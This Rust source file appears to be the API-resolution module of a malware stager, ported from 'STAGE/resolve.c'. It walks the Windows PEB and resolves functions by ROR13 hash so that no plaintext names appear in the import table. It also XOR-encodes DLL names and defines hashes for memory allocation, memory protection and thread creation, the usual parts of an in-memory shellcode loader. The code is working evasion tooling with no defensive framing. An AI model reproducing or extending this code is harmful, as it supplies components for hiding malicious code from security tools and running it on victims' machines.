//! PEB module walk + ROR13 export resolve (port of STAGE/resolve.c).
//! Sensitive APIs are resolved at runtime — no plaintext names in the IAT.

use std::ffi::c_void;
use std::ptr::null_mut;

pub type HMODULE = *mut c_void;
pub type HANDLE = *mut c_void;

const API_CACHE_SIZE: usize = 32;
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;

const HASH_KERNEL32_DLL: u32 = 0x8fecd63f;
const HASH_NTDLL_DLL: u32 = 0xcef6e822;

pub const HASH_NtAllocateVirtualMemory: u32 = 0xd33bcabd;
pub const HASH_NtProtectVirtualMemory: u32 = 0x8c394d89;
pub const HASH_CreateThread: u32 = 0xca2bd06b;
pub const HASH_CloseHandle: u32 = 0x0ffd97fb;
pub const HASH_WaitForSingleObject: u32 = 0xce05d9ad;
pub const HASH_GetModuleHandleExW: u32 = 0xd052428b;
pub const HASH_GetModuleFileNameW: u32 = 0x45b06d8c;
pub const HASH_ExpandEnvironmentStringsW: u32 = 0xeeb585ee;

pub const HASH_LoadLibraryA: u32 = 0xec0e4e8e;
const E_KERNEL32_DLL: [u8; 12] = [0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01, 0x50, 0x4d, 0x56, 0x55, 0x33];
const E_NTDLL_DLL: [u8; 9] = [0x57, 0x4c, 0x57, 0x5e, 0x0b, 0x48, 0x56, 0x0e, 0x0f];

#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct LdrEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: u32,
    _pad: u32,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
}

#[repr(C)]
struct PebLdr {
    _reserved1: [u8; 8],
    _reserved2: [*mut c_void; 3],
    in_memory_order_module_list: ListEntry,
}

#[repr(C)]
struct Peb {
    _reserved1: [u8; 2],
    being_debugged: u8,
    _reserved2: u8,
    _reserved3: [*mut c_void; 2],
    ldr: *mut PebLdr,
}

static mut G_CACHE_MOD: [*mut c_void; API_CACHE_SIZE] = [null_mut(); API_CACHE_SIZE];
static mut G_CACHE_HASH: [u32; API_CACHE_SIZE] = [0; API_CACHE_SIZE];
static mut G_CACHE_FN: [*mut c_void; API_CACHE_SIZE] = [null_mut(); API_CACHE_SIZE];
static mut G_CACHE_COUNT: usize = 0;

pub fn ror13_hash(name: &str) -> u32 {
    let mut h: u32 = 0;
    for &b in name.as_bytes() {
        h = h.rotate_right(13);
        h = h.wrapping_add(u32::from(b));
    }
    h
}

fn ror13_hash_lower_bytes(name: &[u8]) -> u32 {
    let mut h: u32 = 0;
    for &b in name {
        let c = if (b'A'..=b'Z').contains(&b) { b + 32 } else { b };
        h = h.rotate_right(13);
        h = h.wrapping_add(u32::from(c));
    }
    h
}

unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

fn cache_lookup(module: HMODULE, hash: u32) -> Option<*mut c_void> {
    unsafe {
        for i in 0..G_CACHE_COUNT {
            if G_CACHE_MOD[i] == module && G_CACHE_HASH[i] == hash {
                return Some(G_CACHE_FN[i]);
            }
        }
    }
    None
}

fn cache_store(module: HMODULE, hash: u32, func: *mut c_void) {
    if module.is_null() || func.is_null() {
        return;
    }
    unsafe {
        if cache_lookup(module, hash).is_some() {
            return;
        }
        if G_CACHE_COUNT >= API_CACHE_SIZE {
            return;
        }
        let i = G_CACHE_COUNT;
        G_CACHE_MOD[i] = module;
        G_CACHE_HASH[i] = hash;
        G_CACHE_FN[i] = func;
        G_CACHE_COUNT += 1;
    }
}

#[inline(never)]
pub unsafe fn mod_from_peb(base_name_hash: u32) -> Option<HMODULE> {
    let peb = get_peb();
    if peb.is_null() || (*peb).ldr.is_null() {
        return None;
    }
    let head = &mut (*(*peb).ldr).in_memory_order_module_list as *mut ListEntry;
    let mut entry = (*head).flink;
    while !entry.is_null() && entry != head {
        let ldr = (entry as *mut u8).sub(std::mem::offset_of!(LdrEntry, in_memory_order_links))
            as *mut LdrEntry;
        let base_name = &(*ldr).base_dll_name;
        if !base_name.buffer.is_null() && base_name.length > 0 {
            let len = (base_name.length / 2).min(63) as usize;
            let mut name_buf = [0u8; 64];
            for i in 0..len {
                let wc = *base_name.buffer.add(i);
                let c = wc as u8;
                name_buf[i] = if (b'A'..=b'Z').contains(&c) { c + 32 } else { c };
            }
            if ror13_hash_lower_bytes(&name_buf[..len]) == base_name_hash {
                return Some((*ldr).dll_base);
            }
        }
        entry = (*entry).flink;
    }
    None
}

unsafe fn load_module_enc(enc: &[u8]) -> Option<HMODULE> {
    type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> HMODULE;
    let k32 = mod_from_peb(HASH_KERNEL32_DLL).or_else(|| {
        // kernel32 is always loaded; if PEB walk fails, bail
        None
    })?;
    let load_lib = resolve_export(k32, HASH_LoadLibraryA)?;
    let mut name = vec![0u8; enc.len()];
    crate::obf::dc_xd(enc, &mut name);
    let h = (std::mem::transmute::<_, LoadLibraryAFn>(load_lib))(name.as_ptr());
    crate::obf::xe(&mut name);
    if h.is_null() { None } else { Some(h) }
}

pub unsafe fn ntdll() -> Option<HMODULE> {
    mod_from_peb(HASH_NTDLL_DLL).or_else(|| load_module_enc(&E_NTDLL_DLL))
}

pub unsafe fn kernel32() -> Option<HMODULE> {
    mod_from_peb(HASH_KERNEL32_DLL).or_else(|| load_module_enc(&E_KERNEL32_DLL))
}

unsafe fn export_by_hash(module: HMODULE, hash: u32) -> Option<*mut c_void> {
    if module.is_null() {
        return None;
    }
    let base = module as *const u8;
    let dos = base as *const u16;
    if *dos != IMAGE_DOS_SIGNATURE {
        return None;
    }
    let e_lfanew = *(base.add(0x3c) as *const i32);
    if e_lfanew <= 0 {
        return None;
    }
    let nt = base.add(e_lfanew as usize);
    if *(nt as *const u32) != IMAGE_NT_SIGNATURE {
        return None;
    }
    let opt = nt.add(4 + 20);
    let magic = *(opt as *const u16);
    let data_dir_off = if magic == 0x20b { 112 } else { 96 };
    let export_rva = *(opt.add(data_dir_off + IMAGE_DIRECTORY_ENTRY_EXPORT * 8) as *const u32);
    if export_rva == 0 {
        return None;
    }
    let exp = base.add(export_rva as usize);
    let number_of_names = *(exp.add(0x18) as *const u32) as usize;
    let addr_of_functions = base.add(*(exp.add(0x1c) as *const u32) as usize);
    let addr_of_names = base.add(*(exp.add(0x20) as *const u32) as usize);
    let addr_of_ordinals = base.add(*(exp.add(0x24) as *const u32) as usize);

    for i in 0..number_of_names {
        let name_rva = *(addr_of_names.add(i * 4) as *const u32);
        let name_ptr = base.add(name_rva as usize);
        let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
            .to_str()
            .ok()?;
        if ror13_hash(name) != hash {
            continue;
        }
        let ordinal = *(addr_of_ordinals.add(i * 2) as *const u16) as usize;
        let func_rva = *(addr_of_functions.add(ordinal * 4) as *const u32);
        return Some(base.add(func_rva as usize) as *mut c_void);
    }
    None
}

pub unsafe fn resolve_export(module: HMODULE, hash: u32) -> Option<*mut c_void> {
    if let Some(f) = cache_lookup(module, hash) {
        return Some(f);
    }
    let f = export_by_hash(module, hash)?;
    cache_store(module, hash, f);
    Some(f)
}

pub unsafe fn resolve_nt(hash: u32) -> Option<*mut c_void> {
    let m = ntdll()?;
    resolve_export(m, hash)
}

pub unsafe fn resolve_k32(hash: u32) -> Option<*mut c_void> {
    let m = kernel32()?;
    resolve_export(m, hash)
}

pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    usize,
    *mut usize,
    u32,
    u32,
) -> i32;

pub type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
    HANDLE,
    *mut *mut c_void,
    *mut usize,
    u32,
    *mut u32,
) -> i32;

pub type CreateThreadFn = unsafe extern "system" fn(
    *mut c_void,
    usize,
    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
    *mut c_void,
    u32,
    *mut u32,
) -> HANDLE;

pub type CloseHandleFn = unsafe extern "system" fn(HANDLE) -> i32;
pub type WaitForSingleObjectFn = unsafe extern "system" fn(HANDLE, u32) -> u32;

pub type GetModuleHandleExWFn = unsafe extern "system" fn(u32, *const u16, *mut HMODULE) -> i32;
pub type GetModuleFileNameWFn =
    unsafe extern "system" fn(HMODULE, *mut u16, u32) -> u32;
pub type ExpandEnvironmentStringsWFn =
    unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;

pub const NT_CURRENT_PROCESS: HANDLE = -1isize as HANDLE;
pub const MAX_PATH: u32 = 260;
pub const PAGE_READWRITE: u32 = 0x0000_0004;
pub const PAGE_EXECUTE_READ: u32 = 0x0000_0020;
pub const MEM_COMMIT: u32 = 0x0000_1000;
pub const MEM_RESERVE: u32 = 0x0000_2000;
pub const INFINITE: u32 = 0xFFFF_FFFF;

pub const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x0000_0004;
pub const GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: u32 = 0x0000_0002;
